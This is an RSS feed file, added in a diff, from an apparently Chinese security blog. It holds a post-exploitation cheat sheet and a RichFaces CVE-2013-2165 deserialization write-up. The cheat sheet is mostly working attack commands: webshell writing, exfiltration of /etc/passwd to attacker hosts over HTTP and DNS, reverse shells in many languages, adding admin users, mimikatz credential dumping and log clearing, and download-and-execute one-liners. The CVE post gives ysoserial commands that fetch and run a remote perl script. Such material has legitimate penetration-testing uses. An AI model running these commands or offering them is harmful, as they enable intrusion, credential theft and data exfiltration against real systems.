@@ -1,0 +1,1188 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>whynot</title>
+    <description>欢迎来到我的博客~</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Thu, 13 Sep 2018 19:56:26 +0800</pubDate>
+    <lastBuildDate>Thu, 13 Sep 2018 19:56:26 +0800</lastBuildDate>
+    <generator>Jekyll v3.8.3</generator>
+    
+      <item>
+        <title>命令执行总结</title>
+        <description>&lt;h1 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h1&gt;
+&lt;p&gt;命令执行后有关的一些归纳(持续补充)。&lt;/p&gt;
+&lt;h1 id=&quot;0x01-基础详情&quot;&gt;0x01 基础详情&lt;/h1&gt;
+&lt;p&gt;针对命令执行后对系统做更深入的渗透，常规先判断系统类型，命令是否回显，以及目标系统是否能够出网，即系统类型-&amp;gt;是否回显-&amp;gt;能否出网。&lt;/p&gt;
+&lt;h2 id=&quot;1可回显&quot;&gt;1.可回显&lt;/h2&gt;
+&lt;p&gt;webshell(apache tomcat nginx等可直接解析脚本的写入webshell)&lt;/p&gt;
+&lt;h3 id=&quot;window&quot;&gt;window&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dir /s/a-d/b d:\*123456.asp  #查找123456.asp 位置
+echo ^&amp;lt;^%eval request^(chr^(35^)^)^%^&amp;gt; &amp;gt; &quot;d:\JINHER\C6\JHSoft.Web.Login\images\LoginTemplate\whynot.asp&quot; # &amp;lt;&amp;gt;等特殊符号在cmd下需要转码 而且写入文件不可带有&amp;lt;&amp;gt;:等特殊字符
+copy c:\\Inetpub\\wwwroot\\ckfinder\\userfiles\\files\\images\\cknife.jpg c:\\Inetpub\\wwwroot\\ckfinder\\userfiles\\files\\images\\cknife.aspx # 命令不好使时尝试其他命令 
+
+for /F %s in ('dir /s/a-d/b c:\*.aspx') do echo 123 &amp;gt;123.aspx
+在有aspx文件的后面重新生成.aspx的后缀 内容为123 例如a.aspx 生成a.aspx.aspx   #缺点相对暴力 优点不回显有时候也可以用
+for /F %s in ('dir /s/a-d/b f:\*login.css') do echo ^&amp;lt;%@ Page Language=&quot;Jscript&quot;%^&amp;gt;^&amp;lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&amp;gt; &amp;gt;%s.aspx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;linux&quot;&gt;linux&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;locate find等命令 查询文件位置
+echo PD9waHAgcGhwaW5mbygpOz8+ | base64 -d &amp;gt; 360.php   #PD9waHAgcGhwaW5mbygpOz+是&amp;lt;?php phpinfo();?&amp;gt; base64编码 linux文件名不能带有/(斜杠)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;oobout-of-band-无法回显和能出网时使用&quot;&gt;OOB(out of band) (无法回显和能出网时使用)&lt;/h3&gt;
+&lt;p&gt;window&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;基于OOB(out of band)的回显(能出网)
+for /F %s in ('whoami') do start http://10,10.10.10:8080/?user=%s   #查询文件位置web历史记录 会打开目标浏览器
+for /F %s in ('dir /b') do start http://10.10.10.10:81/?user=%s
+
+curl –T {path to file} ftp://xxx.xxx.xxx.xxx –user {username}:{password}    #传输到ftp
+wget –header=&quot;EVIL:$(cat /etc/passwd)&quot; http://xxx.xxx.xxx:xxxx  #需要自搭建server服务器支持
+#wget –header=”evil:`cat /etc/passwd | xargs echo –n`” http://xxx.xxx.xxx:xxxx 
+
+wget –post-data exfil='cat /etc/passwd' http://dnsattacker.com           # extract data  in post section
+wget –post-file trophy.php http://dnsattacker.com    # extract source code
+cat /path/to/sensitive.txt | curl –F &quot;:data=@-&quot; http://dnsattacker.com/test.txt
+
+Viticm
+nc -w 1000 10.10.10.10 1234 &amp;lt; config.php
+Attacker
+nc -l 1234 &amp;gt; config.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;linux&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;基于OOB(out of band)的回显
+#curl `whoami`.xxxx.xxx(子域名)     #可以用该方法把不回显变得回显
+#curl http://10.10.10.10:81/?user=`id`
+#wget http://10.10.10.10:81/?user=`id`
+#ping %USERNAME%.b182oj.ceye.io
+#ping -c 3 `ifconfig en0|grep &quot;inet &quot;|awk '{print $2}'`.test.xxx.com DNS记录获取源IP（根据情况需要修改，不通用）
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;通用的一些&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;需要域名服务器支持
+Victim  #参考https://www.exploit-db.com/docs/english/45370-out-of-band-exploitation-(oob)-cheatsheet.pdf 
+cmd /v /c &quot;ipconfig &amp;gt; output &amp;amp;&amp;amp; certutil -encodehex -f output output.hex 4 &amp;amp;&amp;amp; powershell $text=GetContentoutput.hex;$subdomain=$text.replace(' ','');$j=11111;foreach($i in $subdomain){$final=$j.tostring()+'.'+$i+'.fzrsuf.3w1.pw';$j += 1; nslookup $final }&quot; 
+Attacker
+sudo tcpdump -n port 53 | tee file.txt
+echo &quot;0x$(cat file.txt |tr ' ' '\n' |awk '/file.oob.dnsattacker.com/ {print $1}'|sort -u| cut -d '.' -f 2|tr -d '\n')&quot; | xxd -r -pr
+
+Victim
+wget --header=evil:$(ifconfig|xxd -p -c 100000) http://dnsattacker.com:9000
+Attacker:
+echo &quot;0x$(ncat -lvp 9000 |grep -i evil|tr -d '/' |cut -d ' ' -f2)&quot; |xxd -r -p
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;https://ws2.sinaimg.cn/large/006tNbRwly1fv84afj8z6j31aw0kmajx.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;2可出网&quot;&gt;2.可出网&lt;/h2&gt;
+&lt;p&gt;反弹shell或传马(使用tcpdump -i eth0 icmp 来监听或者搭建web服务器查看访问日志等来能否出网）。&lt;/p&gt;
+&lt;h3 id=&quot;window--使用ping-或者下面的download来判断是否能够出网&quot;&gt;window  使用ping 或者下面的download来判断是否能够出网，&lt;/h3&gt;
+&lt;p&gt;powershell直接反弹(03默认无powershell winserver08默认是2.0）&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.64.128/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.64.128 -port 8888 #反弹shell
+powershell -C &quot;IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -l -p 8888&quot;  #监听本地nc
+
+http://192.168.44.132/2.php?id=1;exec master..xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString(''http://youvps/Empire/data/module_source/code_execution/Invoke-Shellcode.ps1'');Invoke-Shellcode -payload windows/meterpreter/reverse_http -lhost 192.168.44.128 -lport 4444 -force';--   #powershell调用msf反弹
+
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.64.128/nishang/Scan/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254   #扫描端口
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;msf或者nc或者colbat strike传马等(msf为例)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;生成恶意程序上传执行
+msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.127.132 lport=8888 -f dll -o test.dll
+regsvr32 test.dll   #运行dll
+
+attacker监听
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.127.132
+set LPORT 8888
+exploit
+
+nc -vv 115.28.206.51 8080 -e c:\cmd.exe //链接到远程 不输入-e选项即时聊天
+nc -lvvp 8080   //反弹
+nc -nv 192.168.64.1 8080 -e C:\Windows\System32\cmd.exe
+nc -lvp 8080
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;直接添加用户&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user xxx 123!@#qwe /add     #添加用户
+net localgroup administrators xxx /add  #将xxx用户加入管理员
+net user xxx /del   #删除用户
+
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  #开启3389 03 08测试通过
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000001 /f  #关闭3389
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber #查看远程端口 十六进制
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;linux-1&quot;&gt;linux&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;linux自带perl python ruby等语言，反弹shell较为容易 个人建议使用bash perl&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;判断能否出网
+/usr/bin/curl
+/usr/bin/wget
+/bin/ping
+如果担心引号转义麻烦或着其他 可以直接下载到服务器上执行
+wget http://10.0.0.1/123344/back.pl -P /tmp/   去掉前缀脚本
+perl /tmp/back.pl
+
+curl `whoami`.xxxx.xxx(子域名)     #可以用该方法把不回显变得回显
+
+bash反弹
+bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1
+
+上传bash文件
+#!/bin/bash\n\n/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/$1/$2 0&amp;gt;&amp;amp;1
+
+PERL
+perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+
+Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+
+PHP
+php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'
+If you want a .php file to upload, see the more featureful and robust php-reverse-shell.
+
+Ruby
+ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&quot;,f,f,f)'
+
+Netcat
+nc -e /bin/sh 10.0.0.1 1234
+部分版本nc -e不可用时
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f
+
+
+Java
+r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/2002;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&quot;] as String[])
+p.waitFor()
+
+node.js
+require('child_process').exec('bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1');
+nc -lvvp 80
+
+lua
+lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3');&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;2.非交互式添加linux用户&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;useradd -m test
+echo &quot;123456&quot; | passwd --stdin test #非交互式设置密码
+userdel -r test     #删除该用户
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;3.写入.ssh/authorized_keys 或者 crontab&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo 公钥 &amp;gt; .ssh/authorized_keys
+/var/spool/cron/root    #centos 写入root用户任务计划
+/etc/cron.d/shell   #debian 在/etc/cron.d/会被当作任务计划执行
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;3密码抓取&quot;&gt;3.密码抓取&lt;/h2&gt;
+&lt;h3 id=&quot;通用-注意密码抓取需要root权限&quot;&gt;通用 注意密码抓取需要root权限。&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;laz.exe all #通用可以抓取wifi密码,常见浏览器(如google facebook登陆密码)，数据库，outlook邮箱以及操作系统等各种密码     #https://github.com/AlessandroZ/LaZagne   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;window-1&quot;&gt;window&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;提权参考    #https://github.com/SecWiki/windows-kernel-exploits
+powershell IEX (New-Object Net.WebClient).DownloadString('http://74.121.151.89/123344/PowerShell/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://74.121.151.89/123344/ms15-051.exe -ExeArgs &quot;cmd&quot; -ForceASLR #远程执行exe
+mimikatz    #抓取密码
+mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  #https://github.com/gentilkiwi/mimikatz
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.64.128/nishang/Gather/Invoke-Mimikatz.ps1');Invoke-Mimikatz  #远程调用mimikaz  web中注意引号
+mimikaz清除登陆等日志信息
+privilege::debug
+event::drop
+event::clear
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;linux-2&quot;&gt;linux&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./mimipenguin   #支持ubuntu和Fedora部分版本 https://github.com/huntergregal/mimipenguin
+linux提权好用的一些工具
+https://github.com/rebootuser/LinEnum
+https://github.com/mzet-/linux-exploit-suggester
+https://github.com/SecWiki/linux-kernel-exploits
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;4下载执行download-and-exec&quot;&gt;4.下载执行(download and exec)&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;window&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;powershell
+powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\download\a.exe');start-process 'c:\download\a.exe'
+
+certutil    #03 08都可以
+certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe&amp;amp;&amp;amp;c:\download\a.exe
+certutil -urlcache -split -f http://192.168.254.102:80/a.txt b.txt
+certutil -urlcache -split -f http://192.168.254.102:80/a a.js &amp;amp;&amp;amp; cscript a.js &amp;amp;&amp;amp;  del a.js &amp;amp;&amp;amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete  #远程执行js
+certutil -urlcache -split -f http://74.121.151.89/123344/1.vbs a.vbs &amp;amp;&amp;amp; cscript a.vbs &amp;amp;&amp;amp;  del a.vbs &amp;amp;&amp;amp; certutil -urlcache -split -f http://74.121.151.89/123344/1.vbs delete    #加载vbs执行
+vbs 示例代码    #下载保存到c盘
+Set xPost=createObject(&quot;Microsoft.XMLHTTP&quot;)
+xPost.Open &quot;GET&quot;,&quot;http://192.168.206.101/file.zip&quot;,0
+xPost.Send()
+set sGet=createObject(&quot;ADODB.Stream&quot;)
+sGet.Mode=3
+sGet.Type=1
+sGet.Open()
+sGet.Write xPost.ResponseBody
+sGet.SaveToFile &quot;c:\file.zip&quot;,2
+
+win03无 xp以后自带   #下载速度较慢
+bitsadmin /transfer n http://lemon.com/file.zip c:\1.zip
+bitsadmin /transfer n http://74.121.151.89/mimikaz.exe Z:/file/proof/tmp/1.exe
+bitsadmin /transfer n http://download.sysinternals.com/files/PSTools.zip C:\test\update\PSTools.zip
+bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\p.zip
+
+csscript 
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct    #远程执行文件弹出计算器
+
+telnet  
+服务端：nc -lvp 23 &amp;lt; nc.exe
+下载端：telnet ip -f c:\nc.exe
+
+regsvr32
+regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec.sct scrobj.dll
+
+rundll32  
+rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);window.close();
+
+
+mshta
+mshta https://3gstudent.github.io/test/downloadexec2.hta    #需要开启IE浏览器-Internet选项-安全选择可信站点，添加博客地址：https://3gstudent.github.io/
+
+wmic and Regasm/Regsvc
+wmic os get /format:&quot;https://webserver/payload.xsl&quot;
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;linux&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;linux方法通用，这里不讲述过多 详情可参考 https://gtfobins.github.io/
+wget www.baidu.com/1.rar -P /tmp/ #保存到tmp目录下
+curl $URL -o $LFILE
+nc
+lua
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;相关链接如下：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/samratashok/nishang  #powershell框架
+https://github.com/EmpireProject/Empire
+https://github.com/PowerShellMafia/PowerSploit
+https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/
+https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/
+https://gtfobins.github.io/
+http://reverse-tcp.xyz/pentest/red%20team/2017/12/28/windows-to-download-and-execute-arbitrary-code.html
+https://www.exploit-db.com/docs/english/45370-out-of-band-exploitation-(oob)-cheatsheet.pdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;#
+转载请注明：&lt;a href=&quot;https://notwhy.github.io/&quot;&gt;whynot&lt;/a&gt; » &lt;a href=&quot;https://notwhy.gitbooks.io/2018/09/命令执行总结/&quot;&gt;web&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 12 Sep 2018 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2018/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/</guid>
+        
+        <category>web</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>RichFaces反序列话漏洞——CVE-2013-2165</title>
+        <description>&lt;h1 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h1&gt;
+&lt;hr /&gt;
+&lt;p&gt;  本来想学二进制来着,java又出了那么多漏洞，身为一个web安全狗，还是学Java web吧，几乎0基础，大牛请跳过。碰巧工作中遇到实例，就尝试简单分析一下这个(很水的一篇文章四处摘抄，就是想立个flag开个头)。&lt;/p&gt;
+&lt;h1 id=&quot;0x01-基础详情&quot;&gt;0x01 基础详情&lt;/h1&gt;
+&lt;p&gt;在讲述之前先简单介绍一下java反序列化的一些特征。&lt;br /&gt;
+黑盒测试:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;rO0AB   #数据包中有以base64开头的数据开头含有ro0AB yseriol生成的payload转换而来 cat payload.out | base64 -w 0 &amp;gt; payload.out.b64
+&lt;img src=&quot;https://ws3.sinaimg.cn/large/0069RVTdly1fv4fptk2sdj30pa0bstig.jpg&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;aced 0005   #数据包发送时16进制查看时含有的特殊字符 如果是http数据包含有 sr 等字符
+&lt;img src=&quot;https://ws3.sinaimg.cn/large/0069RVTdly1fv4kqos4kcj31au09kn15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;content-type:application/x-serialization 带有序列化头说明了它是是序列化数据
+&lt;img src=&quot;https://ws4.sinaimg.cn/large/0069RVTdly1fv4k2j9n6bj31ku0fa43h.jpg&quot; alt=&quot;&quot; /&gt;
+白盒测试：&lt;br /&gt;
+writeObject 序列化是用于将对象转换成二进制串存储&lt;br /&gt;
+readObjec 将二进制串转换成对象&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;再来看下RichFaces任意java反序列化漏洞&lt;br /&gt;
+&lt;img src=&quot;https://ws2.sinaimg.cn/large/0069RVTdly1furtuu21mkj310003i75q.jpg&quot; alt=&quot;&quot; /&gt;
+影响版本：RichFaces 3.x ≤ 3.3.3 and 4.x ≤ 4.3.2
+修复版本：RichFaces 3.3.4 and 4.3.3&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;RIchFaces存在的漏洞的和利用方式    #因RIchFaces16年不再维护，所以用最新的rf-143应该可以打下
+RichFaces 3
+3.1.0 ≤ 3.3.3: CVE-2013-2165
+3.1.0 ≤ 3.3.4: RF-14310
+RichFaces 4
+4.0.0 ≤ 4.3.2: CVE-2013-2165
+4.0.0 ≤ 4.5.4: CVE-2015-0279
+4.5.3 ≤ 4.5.17: RF-14309
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;0x02-漏洞分析&quot;&gt;0x02 漏洞分析&lt;/h1&gt;
+&lt;p&gt;本地环境 mac + idea2018.01 + tomcat7&lt;br /&gt;
+&lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2016/angry%20seam/angryseam.war&quot;&gt;angryseam.war&lt;/a&gt;  &lt;br /&gt;
+&lt;a href=&quot;http://seamframework.org/Seam2/Downloads.html&quot;&gt;相关jar包&lt;/a&gt; #导入相应的jar包&lt;br /&gt;
+我们先简单看下漏洞详情 
+&lt;img src=&quot;https://ws2.sinaimg.cn/large/0069RVTdly1furuh6w3xnj31400guage.jpg&quot; alt=&quot;&quot; /&gt;
+因为我使用的是RichFaces3.x，所以针对3.x来说，在请求资源的时候，会进入ResourceBuilderImpl.getResourceDataForKey(String)来进行处理，如果请求资源以/DATA或者/DATB为开头，数据会被ResourceBuilderImpl.decrypt(byte)解密，然后进行相关反序列化。
+在org.ajax4jsf.resource.ResourceBuilderImpl中232行getResourceDataForKey函数中。
+将传递过来的key解密，后续传入readobject造成反序列化造成命令执行。
+&lt;img src=&quot;https://ws2.sinaimg.cn/large/0069RVTdly1furv6pwvwxj31kw0qn4di.jpg&quot; alt=&quot;&quot; /&gt;
+richfaces库默认处理a4j开头的路径资源然后将/a4j/g/3_3_3.Finalorg/版本信息移除&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/a4j/g/3_3_3.Finalorg/richfaces/renderkit/html/scripts/skinning.js/DATA/xxxx 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;然会将资源传入getResourceDataForKey并将DATA后面的解码
+构造payload时 我们只需要调用该方法下面的encrypt即可
+&lt;img src=&quot;https://ws2.sinaimg.cn/large/0069RVTdly1furzrgzv3sj31kw0ryqdv.jpg&quot; alt=&quot;&quot; /&gt;
+具体poc相关代码如下
+&lt;img src=&quot;https://ws3.sinaimg.cn/large/0069RVTdly1furzt2vofzj31kw0kytkn.jpg&quot; alt=&quot;&quot; /&gt;
+利用方法:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;先用ysoserial生成相关payload
+java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections5 &quot;wget http://74.121.151.89/123344/back.pl -P /tmp/&quot; &amp;gt; payload.bin
+java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections5 &quot;perl /tmp/back.pl&quot; &amp;gt; p.bin
+然后执行hello.java生成加密后payload，再访问即可
+http://localhost:8011/seam/a4j/g/3_3_3.Finalorg/richfaces/renderkit/html/scripts/skinning.js/DATA/your-payload
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;rf-14310-arbitrary-el-evaluation&quot;&gt;RF-14310: Arbitrary EL Evaluation&lt;/h1&gt;
+&lt;p&gt;容我先发出来，先学一波java，后续补充。
+其他参考链接如下：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.polaris-lab.com/index.php/archives/567/
+https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
+https://github.com/federicodotta/Java-Deserialization-Scanner/releases
+http://vnprogramming.com/index.php/2016/10/10/web500-hitconctf-2016-and-exploit-cve-2013-2165/
+https://codewhitesec.blogspot.com/2018/05/poor-richfaces.html
+https://bl4ck.in/vulnerability/analysis/2018/03/28/Attack-Seam-Framework.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;#
+转载请注明：&lt;a href=&quot;https://notwhy.github.io/&quot;&gt;whynot&lt;/a&gt; » &lt;a href=&quot;https://notwhy.gitbooks.io//2018/08/RichFaces反序列话漏洞——CVE-2013-2165/&quot;&gt;code-audit&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 30 Aug 2018 00:00:00 +0800</pubDate>
